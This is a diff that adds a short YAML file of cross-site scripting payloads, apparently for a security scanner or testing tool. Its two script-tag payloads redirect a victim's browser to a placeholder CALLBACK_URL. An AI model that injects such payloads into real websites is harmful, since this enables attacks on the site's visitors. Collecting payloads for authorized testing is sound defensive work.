@@ -1,0 +1,5 @@
+name: XSS
+payloads:
+  - description: A simple XSS payload (single quotes)
+    payload: <script>document.location='CALLBACK_URL'</script>
+  - payload: <script>document.location="CALLBACK_URL"</script>
